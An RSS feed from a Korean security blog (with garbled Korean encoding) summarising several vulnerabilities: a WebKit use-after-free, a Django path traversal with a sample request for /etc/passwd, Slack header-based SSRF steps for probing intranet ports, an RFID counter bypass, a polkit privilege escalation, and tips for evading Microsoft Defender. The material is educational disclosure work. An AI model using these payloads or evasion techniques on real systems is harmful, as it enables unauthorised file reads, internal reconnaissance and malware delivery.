<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0"
  xmlns:atom="http://www.w3.org/2005/Atom"
  xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>hackyboiz</title>
    <link>https://hackyboiz.github.io/</link>
    
    <atom:link href="https://hackyboiz.github.io/rss2.xml" rel="self" type="application/rss+xml"/>
    
    <description>hack &amp; life</description>
    <pubDate>Sat, 12 Jun 2021 04:09:12 GMT</pubDate>
    <generator>http://hexo.io/</generator>
    
    <item>
      <title>[í•˜ë£¨í•œì¤„] CVE-2021-21779: Webkit Webcore use-after-free</title>
      <link>https://hackyboiz.github.io/2021/06/12/fabu1ous/2021-06-12/</link>
      <guid>https://hackyboiz.github.io/2021/06/12/fabu1ous/2021-06-12/</guid>
      <pubDate>Sat, 12 Jun 2021 05:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://talosintelligence.com/vulnerability_reports/TALOS</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://talosintelligence.com/vulnerability_reports/TALOS-2021-1238">Webkit WebCore::GraphicsContext use-after-free vulnerability</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a><strong>Target</strong></h2><p>WebKitGTK 2.30.4</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a><strong>Explain</strong></h2><p>WebkitGTK 2.30.4ì˜ GraphicsContextëŠ” íŠ¹ì • ì´ë²¤íŠ¸ë¥¼ í•¸ë“¤ í•  ë•Œ use-after-free ì·¨ì•½ì ì´ ë°œìƒí•©ë‹ˆë‹¤. Webkitì€ ì˜¤í”ˆì†ŒìŠ¤ ì›¹ ì½˜í…ì¸  ì—”ì§„ìœ¼ë¡œ ë¸Œë¼ìš°ì €ë¥¼ ë¹„ë¡¯í•œ ì—¬ëŸ¬ ì‘ìš©í”„ë¡œê·¸ë¨ì—ì„œ ì‚¬ìš©í•©ë‹ˆë‹¤.</p><p>Webkitì˜ <code>fillText()</code> í•¨ìˆ˜ëŠ” HTMLCanvasElement ë‚´ë¶€ íŠ¹ì • ì¢Œí‘œì— ë¬¸ìì—´ì„ ì¶œë ¥í•©ë‹ˆë‹¤. HTMLCanvasElementëŠ” <code>m_width</code>ì™€ <code>m_height</code>ê°’ì„ ê°–ê³  ìˆëŠ”ë° ì´ì— ë§ì¶° <code>fillText()</code> í•¨ìˆ˜ê°€ ì¶œë ¥í•  ë¬¸ìì—´ì˜ ì¢Œí‘œê°€ ìœ íš¨í•œ ë²”ìœ„ ë‚´ì— ìˆëŠ”ì§€ ê²€ì‚¬í•©ë‹ˆë‹¤.</p><p>HTMLCanvasElementëŠ” ë°±ê·¸ë¼ìš´ë“œì—ì„œ ìˆ˜í–‰ëœ ë³€ê²½ ì‚¬í•­ì— ë”°ë¼ <code>m_height</code> ê°’ì„ ì—…ë°ì´íŠ¸í•˜ì§€ë§Œ ì—…ë°ì´íŠ¸ë˜ê¸° ì´ì „ì˜ <code>m_height</code>ê°’ì„ ì‚¬ìš©í•´ ë©”ëª¨ë¦¬ë¥¼ í• ë‹¹í•©ë‹ˆë‹¤. ë˜í•œ <code>fillGradient()</code> í•¨ìˆ˜ê°€ í˜¸ì¶œë˜ë©´ ì—…ë°ì´íŠ¸ë˜ê¸° ì´ì „ì˜ ê°’ì„ ì‚¬ìš©í•´ í• ë‹¹ í•´ì œëœ ë©”ëª¨ë¦¬ì— ì ‘ê·¼í•©ë‹ˆë‹¤.</p><p>ìœ„ ì·¨ì•½ì ì„ ì•…ìš©í•œ ì›¹ì‚¬ì´íŠ¸ì— ì ‘ì†í•  ê²½ìš° information leak ë° ì¶”ê°€ memory corruptionì— ì˜í•œ í”¼í•´ë¥¼ ë³¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/Fabu1ous/">Fabu1ous</category>
      
      <category domain="https://hackyboiz.github.io/tags/use-after-free/">use after free</category>
      
      <category domain="https://hackyboiz.github.io/tags/uaf/">uaf</category>
      
      <category domain="https://hackyboiz.github.io/tags/webkit/">webkit</category>
      
      
      <comments>https://hackyboiz.github.io/2021/06/12/fabu1ous/2021-06-12/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[í•˜ë£¨í•œì¤„] CVE-2021-33203: Django path traversal vulnerability</title>
      <link>https://hackyboiz.github.io/2021/06/11/l0ch/2021-06-11/</link>
      <guid>https://hackyboiz.github.io/2021/06/11/l0ch/2021-06-11/</guid>
      <pubDate>Fri, 11 Jun 2021 05:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://securitylab.github.com/advisories/GHSL-2021-075-d</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://securitylab.github.com/advisories/GHSL-2021-075-django/">GHSL-2021-075: Path injection in Django - CVE-2021-33203</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>tested version: Django 3.2.2</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>íŒŒì´ì¬ìœ¼ë¡œ ì‘ì„±ëœ ì˜¤í”ˆì†ŒìŠ¤ ì›¹ í”„ë ˆì„ì›Œí¬ Djangoì—ì„œëŠ”  <code>django.contrib.admindocs</code> ëª¨ë“ˆì´ í™œì„±í™”ë˜ì—ˆì„ ë•Œ path traversal ì·¨ì•½ì ì´ ë°œìƒí•©ë‹ˆë‹¤.</p><pre><code class="hljs python"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TemplateDetailView</span>(<span class="hljs-params">BaseAdminDocsView</span>):</span>...<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_context_data</span>(<span class="hljs-params">self, **kargs</span>):</span>...template_file = Path(directory) / template<span class="hljs-keyword">if</span> template_file.exists():template_contents = template_file.read_text()...</code></pre><p><code>get_context_data()</code> í•¨ìˆ˜ì—ì„œ í•´ì»¤ëŠ” template ë³€ìˆ˜ë¥¼ ì„ì˜ì˜ ê°’ìœ¼ë¡œ ì„¤ì •í•  ìˆ˜ ìˆê³  ì´ë¥¼ ë³„ë‹¤ë¥¸ ê²€ì¦ ì—†ì´ Path joiní•©ë‹ˆë‹¤. ì´ë¥¼ ì´ìš©í•´ template directory ì™¸ë¶€ ê²½ë¡œì˜ íŒŒì¼ì„ ì œê³µí•  ìˆ˜ ìˆì–´ <code>http://localhost:8000/admin/doc/templates//etc/passwd/</code> ì™€ ê°™ì´ ìš”ì²­ì„ ë³´ë‚´ëŠ” ê²ƒìœ¼ë¡œ íŒŒì¼ ì‹œìŠ¤í…œ ë‚´ ì„ì˜ ê²½ë¡œì˜ íŒŒì¼ ë‚´ìš©ì´ ë Œë”ë§ ë©”ì„œë“œë¡œ ì „ë‹¬ë˜ì–´ íŒŒì¼ ë‚´ìš©ì´ ìœ ì¶œë  ìˆ˜ ìˆìŠµë‹ˆë‹¤. í•´ë‹¹ ì·¨ì•½ì ì€ ì•„ë˜ì™€ ê°™ì´ <code>safe_join</code> í•¨ìˆ˜ë¥¼ ì‚¬ìš©í•´ ê²½ë¡œë¥¼ í•©ì¹˜ëŠ” ê²ƒìœ¼ë¡œ íŒ¨ì¹˜ë˜ì—ˆìŠµë‹ˆë‹¤.</p><pre><code class="hljs python">template_file = Path(safe_join(directory, template))</code></pre><p>ìì„¸í•œ íŒ¨ì¹˜ íˆìŠ¤í† ë¦¬ëŠ” <a href="https://github.com/django/django/commit/46572de2e92fdeaf047f80c44d52269e54ad68db">https://github.com/django/django/commit/46572de2e92fdeaf047f80c44d52269e54ad68db</a> ì—ì„œ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/cve/">cve</category>
      
      <category domain="https://hackyboiz.github.io/tags/L0ch/">L0ch</category>
      
      <category domain="https://hackyboiz.github.io/tags/path-traversal/">path traversal</category>
      
      <category domain="https://hackyboiz.github.io/tags/django/">django</category>
      
      <category domain="https://hackyboiz.github.io/tags/python/">python</category>
      
      
      <comments>https://hackyboiz.github.io/2021/06/11/l0ch/2021-06-11/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[í•˜ë£¨í•œì¤„] í—¤ë” ìˆ˜ì •ì„ í†µí•œ Slack infra metadata ìœ ì¶œ</title>
      <link>https://hackyboiz.github.io/2021/06/10/idioth/2021-06-10/</link>
      <guid>https://hackyboiz.github.io/2021/06/10/idioth/2021-06-10/</guid>
      <pubDate>Thu, 10 Jun 2021 05:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://hackerone.com/reports/727330&quot;&gt;Header modification</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://hackerone.com/reports/727330">Header modification results in disclosure of Slack infra metadata to unauthorized parties</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Slack</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>í´ë¼ìš°ë“œ ê¸°ë°˜ íŒ€ í˜‘ì—… ë„êµ¬ Slackì˜ <em>files.slack.com</em> ë„ë©”ì¸ì—ì„œ í˜¸ìŠ¤íŠ¸ í—¤ë” ëŒ€ì‹  <code>X-Forwarded-Host</code> í—¤ë”ë¥¼ ì‚¬ìš©í•˜ì—¬ infra metadataë¥¼ ìœ ì¶œí•  ìˆ˜ ìˆëŠ” ì·¨ì•½ì ì´ ë°œê²¬ë˜ì—ˆìŠµë‹ˆë‹¤.</p><p>í˜¸ìŠ¤íŠ¸ê°€ <em>files.slack.com</em>ì´ ì•„ë‹ ë•Œ, í•´ë‹¹ URLì€ 500 Internal server errorë¥¼ ë°˜í™˜í•˜ëŠ” ìœ íš¨ì„± ê²€ì‚¬ê°€ ì¡´ì¬í•©ë‹ˆë‹¤. í•˜ì§€ë§Œ í˜¸ìŠ¤íŠ¸ ì´ë¦„ì˜ ë ë¶€ë¶„ì— â€˜@â€™ë¥¼ ì¶”ê°€í•˜ì—¬ í•´ë‹¹ ê²€ì‚¬ë¥¼ ìš°íšŒí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ë˜í•œ í•´ë‹¹ requestëŠ” í”„ë¡ íŠ¸ ì—”ë“œê°€ ì•„ë‹Œ ë°± ì—”ë“œë¡œ ì „ë‹¬ë˜ì–´ Blind SSRF ì·¨ì•½ì ì´ ì¡´ì¬í•˜ë©´ ì¸íŠ¸ë¼ë„·ì— arbitrary requestë¥¼ ì „ì†¡í•˜ì—¬ ì‘ë‹µ ì‹œê°„ì„ í†µí•´ ë‹¤ì–‘í•œ ì •ë³´ë¥¼ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><p>ì´ë¥¼ í†µí•´ ì¸íŠ¸ë¼ë„·ì— ì—´ë ¤ìˆëŠ” í¬íŠ¸ë¥¼ í™•ì¸í•˜ëŠ” ê³¼ì •ì€ ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤.</p><ol><li><p>ìŠ¬ë™ì— íŒŒì¼ì„ ì—…ë¡œë“œí•˜ê³  â€œOpen originalâ€ì„ í†µí•´ ì›ë³¸ ì´ë¯¸ì§€ ê²½ë¡œë¥¼ ì°¾ì•„ burp suiteë¡œ ê°€ì ¸ì˜µë‹ˆë‹¤.</p></li><li><p>repeaterë¡œ ì „ì†¡í•˜ê³  í´ë¦­í•˜ì—¬ ì •ìƒì ìœ¼ë¡œ ì ‘ê·¼ë˜ëŠ”ì§€ í™•ì¸í•©ë‹ˆë‹¤.</p></li><li><p><code>X-Forwarded-Host: xxx.com</code>ì„ í—¤ë”ì— ì¶”ê°€í•˜ì—¬ 500 errorê°€ ë°œìƒí•˜ëŠ”ì§€ í™•ì¸í•©ë‹ˆë‹¤.</p></li><li><p><code>X-Forwarded-Host: file.slack.com@YOUR_DOMAIN</code>ìœ¼ë¡œ í—¤ë”ë¥¼ ìˆ˜ì •í•˜ê³  302 responseê°€ ì˜¤ëŠ”ì§€ í™•ì¸í•©ë‹ˆë‹¤. ê²½ë¡œëŠ” <code>YOUR_DOMAIN/files-pri/...</code>ë¡œ ì§€ì •í•©ë‹ˆë‹¤.</p></li><li><p>ë„ë©”ì¸ì— requestê°€ ì „ì†¡ë˜ì—ˆëŠ”ì§€ í™•ì¸í•˜ê³  ë„ë©”ì¸ì„ ì¸íŠ¸ë¼ë„· IPë¡œ ë³€ê²½í•©ë‹ˆë‹¤. í¬íŠ¸ë¥¼ ë°”ê¿”ê°€ë©° ì‘ë‹µ ì‹œê°„ì„ í™•ì¸í•©ë‹ˆë‹¤.</p></li></ol>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/information-disclosure/">information disclosure</category>
      
      <category domain="https://hackyboiz.github.io/tags/idioth/">idioth</category>
      
      <category domain="https://hackyboiz.github.io/tags/slack/">slack</category>
      
      <category domain="https://hackyboiz.github.io/tags/ssrf/">ssrf</category>
      
      
      <comments>https://hackyboiz.github.io/2021/06/10/idioth/2021-06-10/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[í•˜ë£¨í•œì¤„] CVE-2021-33881: RFID tear off attack, bypass monotonic counter</title>
      <link>https://hackyboiz.github.io/2021/06/09/fabu1ous/2021-06-09/</link>
      <guid>https://hackyboiz.github.io/2021/06/09/fabu1ous/2021-06-09/</guid>
      <pubDate>Wed, 09 Jun 2021 05:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://blog.quarkslab.com/rfid-monotonic-counter-anti-te</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://blog.quarkslab.com/rfid-monotonic-counter-anti-tearing-defeated.html#eeprom-tear2">RFID: Monotoic Counter Anti-Tearing Defeated</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a><strong>Target</strong></h2><p>MIFARE Ultralight EV1, MF0UL</p><p>MIFARE Ultralight C, MF0ICU</p><p>MIFARE Ultralight NANO, MF0UN</p><p>NT2L1, NT2H10, NT2H12</p><p>N2H13, NT2H15, NT2H16</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a><strong>Explain</strong></h2><p>NXP MIFARE Ultralightì™€ NTAG ì¹´ë“œëŠ” replay ê³µê²©ì„ ë°©ì§€í•˜ê¸° ìœ„í•œ Monotonic Counter ê¸°ëŠ¥ì„ ì‚¬ìš©í•˜ëŠ”ë° í•´ë‹¹ ê¸°ëŠ¥ì„ tear off ê³µê²©ì„ í†µí•´ ë¬´ë ¥í™”í•  ìˆ˜ ìˆëŠ” ì·¨ì•½ì ì´ ë°œê²¬ë˜ì—ˆìŠµë‹ˆë‹¤. Tear off ê³µê²©ì´ë€ RFID íƒœê·¸ì™€ ë¦¬ë” ì‚¬ì´ ë°ì´í„° í†µì‹ ì´ ì´ë£¨ì–´ì§€ëŠ” ë„ì¤‘ì— í†µì‹ ì„ ëŠì–´ë²„ë¦¬ëŠ” ê³µê²© ë°©ì‹ìœ¼ë¡œ EEPROMì´ ì“°ê¸° ì‘ì—…ì„ í•˜ëŠ” ë™ì•ˆ RFID íƒœê·¸ì˜ ë°ì´í„°ê°€ ì¼ê´€ë˜ì§€ ì•Šì€ ìƒíƒœë¡œ ìœ ì§€ë˜ì–´ ë²„ê·¸ê°€ ë°œìƒí•˜ë„ë¡ ìœ ë„í•©ë‹ˆë‹¤.</p><p>MIFARE Ultralight EV1ì€ 24-bit Monotonic Counterë¥¼ ì‚¬ìš©í•˜ê³  ì´ì™€ ê´€ë ¨ëœ ì»¤ë©˜ë“œë¥¼ ì‚¬ìš©í•©ë‹ˆë‹¤.</p><ol><li><code>INCR_CNT</code> : Counterë¥¼ ì¦ê°€ì‹œí‚¨ë‹¤.</li><li><code>READ_CNT</code> : í˜„íƒœ Counterì˜ ê°’ì„ ì½ëŠ”ë‹¤.</li><li><code>CHECK_TEARING_EVENT</code> : anti-tearing 8-bit flagë¥¼ ê²€ì¦í•œë‹¤.</li></ol><p><code>INCR_CNT</code>ë¥¼ í†µí•´ ìœ íš¨í•œ Counterì˜ ê°’ì„ ì¦ê°€ ì‹œí‚´ê³¼ ë™ì‹œì— tear off ê³µê²©ì„ ìˆ˜í–‰í•˜ë©´ Counterì— ëŒ€í•œ ì“°ê¸° ì‘ì—…ì— ì¸í„°ëŸ½íŠ¸ë¥¼ ê±¸ ìˆ˜ ìˆê³ , <code>READ_CNT</code>ê°€ ì´ì „ Counterì˜ ê°’ì„ ë¦¬í„´í•˜ë©´ì„œ <code>CHECK_TEARING_EVENT</code>ê°€ ì •ìƒì ì¸ ê²€ì¦ flagë¥¼ ë¦¬í„´í•˜ëŠ” ìƒí™©ì„ ë§Œë“¤ ìˆ˜ ìˆìŠµë‹ˆë‹¤. </p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/Fabu1ous/">Fabu1ous</category>
      
      <category domain="https://hackyboiz.github.io/tags/bypass/">bypass</category>
      
      <category domain="https://hackyboiz.github.io/tags/rfid/">rfid</category>
      
      <category domain="https://hackyboiz.github.io/tags/monotonic-counter/">monotonic counter</category>
      
      <category domain="https://hackyboiz.github.io/tags/tear-off/">tear off</category>
      
      
      <comments>https://hackyboiz.github.io/2021/06/09/fabu1ous/2021-06-09/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[í•˜ë£¨í•œì¤„] CVE-2021-3560: Ubuntu/Fedora ì¸ì¦ ê´€ë¦¬ í”„ë¡œê·¸ë¨ polkitì˜ ë¡œì»¬ ê¶Œí•œ ìƒìŠ¹ ì·¨ì•½ì </title>
      <link>https://hackyboiz.github.io/2021/06/08/l0ch/2021-06-08/</link>
      <guid>https://hackyboiz.github.io/2021/06/08/l0ch/2021-06-08/</guid>
      <pubDate>Tue, 08 Jun 2021 05:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://seclists.org/oss-sec/2021/q2/180&quot;&gt;CVE-2021-3560 p</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://seclists.org/oss-sec/2021/q2/180">CVE-2021-3560 polkit: local privilege escalation using polkit_system_bus_name_get_creds_sync()</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>polkit 0.113 ~ 0.118</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>polkitì€ Unix ê³„ì—´ OS(Ubuntu, Fedora ë“±ì˜ ë¦¬ëˆ…ìŠ¤ ë°°í¬íŒ)ì—ì„œ ì‹œìŠ¤í…œ ì „ë°˜ì˜ ì¸ì¦ì„ í†µì œí•˜ëŠ” í”„ë¡œê·¸ë¨ìœ¼ë¡œ, sudo ë“± ê¸°ì¡´ ì¸ì¦ ì‹œìŠ¤í…œê³¼ ë‹¬ë¦¬ ëŠìŠ¨í•œ ìˆ˜ì¤€ì˜ ì¸ì¦ì„ ìˆ˜í–‰í•´ ê¶Œí•œì´ ì—†ëŠ” í”„ë¡œì„¸ìŠ¤ê°€ ê¶Œí•œ ìˆëŠ” ê³„ì •ê³¼ ì»¤ë®¤ë‹ˆì¼€ì´ì…˜ì„ í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><p><img src="/2021/06/08/l0ch/2021-06-08/1.png"></p><blockquote><p>ì¶œì²˜ : <a href="https://ko.wikipedia.org/wiki/%ED%8F%B4%ED%82%B7">ìœ„í‚¤ë°±ê³¼</a></p></blockquote><p>polkitì€  <code>polkit_system_bus_name_get_creds_sync()</code> í•¨ìˆ˜ë¥¼ ì‚¬ìš©í•´ ê¶Œí•œì´ í•„ìš”í•œ ì‘ì—…ì„ ìš”ì²­í•˜ëŠ” í”„ë¡œì„¸ìŠ¤ì˜ uid ë° pidë¥¼ ê°€ì ¸ì˜µë‹ˆë‹¤. í•´ë‹¹ í•¨ìˆ˜ëŠ” ìš”ì²­ í”„ë¡œì„¸ìŠ¤ì˜ ê³ ìœ í•œ bus nameì„ <a href="https://ko.wikipedia.org/wiki/D-Bus">D-bus</a>ì˜ <code>dbus-daemon</code>ì— ì „ì†¡í•´ ìš”ì²­ í”„ë¡œì„¸ìŠ¤ì˜ ê¶Œí•œì„ í™•ì¸í•˜ëŠ”ë°, ê¶Œí•œ ìƒìŠ¹ ì·¨ì•½ì ì€ í•¨ìˆ˜ í˜¸ì¶œ ì§ì „ì— ìš”ì²­ í”„ë¡œì„¸ìŠ¤ì™€ <code>dbus-daemon</code>ì˜ ì—°ê²°ì´ ëŠì–´ì§ˆ ë•Œ ë°œìƒí•©ë‹ˆë‹¤. <code>dbus-daemon</code>ì€ ì—°ê²°ì´ ëŠì–´ì§„ í”„ë¡œì„¸ìŠ¤ì˜ bus nameì´ ìœ íš¨í•˜ì§€ ì•Šìœ¼ë¯€ë¡œ error ì‘ë‹µì„ ë³´ë‚´ì§€ë§Œ <code>polkit_system_bus_name_get_creds_sync()</code> í•¨ìˆ˜ì—ì„œ ì´ë¥¼ í™•ì¸í•˜ì§€ ì•Šì•„ ì„±ê³µì ìœ¼ë¡œ í”„ë¡œì„¸ìŠ¤ì˜ ì •ë³´ë¥¼ ê°€ì ¸ì™”ë‹¤ëŠ” ì˜ë¯¸ì˜ TRUEë¥¼ ë°˜í™˜í•©ë‹ˆë‹¤. í•´ë‹¹ í•¨ìˆ˜ì˜ í˜¸ì¶œì ì¼ë¶€ëŠ” ì¶”ê°€ì ì¸ ê²€ì¦ ì—†ì´ 0ìœ¼ë¡œ ì´ˆê¸°í™”ëœ <code>AsyncGetBusNameCredsData</code> êµ¬ì¡°ì²´ë¥¼ ì°¸ì¡°í•˜ê²Œ ë˜ì–´ ìš”ì²­ í”„ë¡œì„¸ìŠ¤ì˜ uidë¥¼ 0ìœ¼ë¡œ ìƒê°í•˜ê³  root í”„ë¡œì„¸ìŠ¤ê°€ ìš”ì²­í•œ ê²ƒìœ¼ë¡œ ì‘ì—…ì„ ìˆ˜í–‰í•©ë‹ˆë‹¤.</p><p>ì·¨ì•½ì ì˜ íŒ¨ì¹˜ ì •ë³´ëŠ” <a href="https://gitlab.freedesktop.org/polkit/polkit/-/commit/a04d13a">https://gitlab.freedesktop.org/polkit/polkit/-/commit/a04d13a</a>  ì—ì„œ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/cve/">cve</category>
      
      <category domain="https://hackyboiz.github.io/tags/lpe/">lpe</category>
      
      <category domain="https://hackyboiz.github.io/tags/L0ch/">L0ch</category>
      
      <category domain="https://hackyboiz.github.io/tags/ubuntu/">ubuntu</category>
      
      <category domain="https://hackyboiz.github.io/tags/local-privilege-escalation/">local privilege escalation</category>
      
      <category domain="https://hackyboiz.github.io/tags/fedora/">fedora</category>
      
      
      <comments>https://hackyboiz.github.io/2021/06/08/l0ch/2021-06-08/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[í•˜ë£¨í•œì¤„] ê°„ë‹¨í•œ Defender ìš°íšŒ ë°©ë²•</title>
      <link>https://hackyboiz.github.io/2021/06/07/idioth/2021-06-07/</link>
      <guid>https://hackyboiz.github.io/2021/06/07/idioth/2021-06-07/</guid>
      <pubDate>Mon, 07 Jun 2021 05:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://arty-hlr.com/blog/2021/05/06/how-to-bypass-defend</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://arty-hlr.com/blog/2021/05/06/how-to-bypass-defender/">How to bypass Defender in a few easy steps</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Windows</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>ì•ˆí‹° ë°”ì´ëŸ¬ìŠ¤ëŠ” ê¸°ë³¸ì ìœ¼ë¡œ signature detection, heuristics detection, in memory detectionì„ í†µí•´ ì•…ì„±ì½”ë“œë¥¼ íƒì§€í•©ë‹ˆë‹¤.</p><p>signatureì˜ ê²½ìš° ì´ë¯¸ ì•Œë ¤ì§„ ì•…ì„±ì½”ë“œì˜ íŒŒì¼ ì „ì²´ì˜ í•´ì‰¬ ê°’ì´ë‚˜ ì•…ì„± í–‰ìœ„ë¥¼ í•˜ëŠ” ë¶€ë¶„ì˜ ì¼ë¶€ í•´ì‰¬ ê°’ê³¼ ë¹„êµí•˜ì—¬ ì•…ì„±ì½”ë“œë¥¼ íƒì§€í•©ë‹ˆë‹¤. heuristicsëŠ” signature íƒì§€ ë‹¤ìŒ ë‹¨ê³„ì—ì„œ ì§„í–‰ë˜ëŠ” ê²ƒìœ¼ë¡œ ì•…ì„±ì½”ë“œë¥¼ ì—ë®¬ë ˆì´íŒ…í•˜ì—¬ ì–´ì…ˆë¸”ë¦¬ë‚˜ ì½”ë“œë¥¼ ì‚´í´ë³´ê³  ì–´ë– í•œ í–‰ìœ„ë¥¼ í•˜ëŠ”ì§€ í™•ì¸í•˜ì—¬ ì•…ì„±ì½”ë“œë¥¼ íƒì§€í•©ë‹ˆë‹¤. í•˜ì§€ë§Œ, ë””ìŠ¤í¬ì— íŒŒì¼ì´ ì—†ëŠ” fileless ì•…ì„±ì½”ë“œ(powershell, vba macro, reflection for c# assembly)ì˜ ê²½ìš° Microsoft DefenderëŠ” <a href="https://docs.microsoft.com/ko-kr/windows/win32/amsi/antimalware-scan-interface-portal">AMSI</a> ìŠ¤ìº”ì„ í†µí•´ ì•…ì„±ì½”ë“œë¥¼ íƒì§€í•©ë‹ˆë‹¤.</p><p>signature detectionì„ ìš°íšŒí•˜ê¸° ìœ„í•´ì„œëŠ” ì–´ë– í•œ ë¶€ë¶„ì„ ì•ˆí‹° ë°”ì´ëŸ¬ìŠ¤ê°€ ì•…ì„±ì½”ë“œë¡œ íŒë‹¨í–ˆëŠ”ì§€ ì•Œì•„ë‚´ì•¼ í•©ë‹ˆë‹¤. AntiScan.me, VirusTotalì—ì„œ <code>DefenderCheck</code>, <code>Find-AVSignature</code> ë“±ì„ í™œìš©í•˜ì—¬ íŒë‹¨í•˜ëŠ” ë¶€ë¶„ì„ ì°¾ì•„ë‚¸ í›„ í•´ë‹¹ ë¬¸ìì—´ì„ ë¦¬íŒ©í„°ë§í•˜ê±°ë‚˜ ì–´ì…ˆë¸”ë¦¬ë¥¼ ìˆ˜ì •í•  ìˆ˜ ìˆì§€ë§Œ ê° ì•ˆí‹° ë°”ì´ëŸ¬ìŠ¤ë§ˆë‹¤ ìˆ˜í–‰í•˜ê±°ë‚˜ íŒŒì¼ì´ ì†ìƒë  ê°€ëŠ¥ì„±ì´ ì¡´ì¬í•©ë‹ˆë‹¤. ë”°ë¼ì„œ <a href="https://github.com/mkaring/ConfuserEx">ConfuserEx</a> ê°™ì€ ë„êµ¬ë¥¼ í†µí•´ ì½”ë“œë¥¼ ë‚œë…í™”í•˜ì—¬ signature detectionì„ ìš°íšŒí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><p>C#ìœ¼ë¡œ ì‘ì„±ëœ ì•…ì„±ì½”ë“œì˜ ê²½ìš° <a href="https://github.com/Flangvik/NetLoader">NetLoader</a>ë¥¼ ì‚¬ìš©í•˜ì—¬ heuristics detectionê³¼ in memory detectionì„ ìš°íšŒí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. NetLoaderëŠ” C# ì–´ì…ˆë¸”ë¦¬ë¥¼ ê²½ë¡œ, URLì´ë‚˜ SM ê³µìœ ì—ì„œ reflectionì„ í†µí•´ ë¡œë“œí•©ë‹ˆë‹¤. ë””ìŠ¤í¬ì— ì•…ì„± íŒŒì¼ì´ ì¡´ì¬í•˜ì§€ ì•Šì•„ heuristics 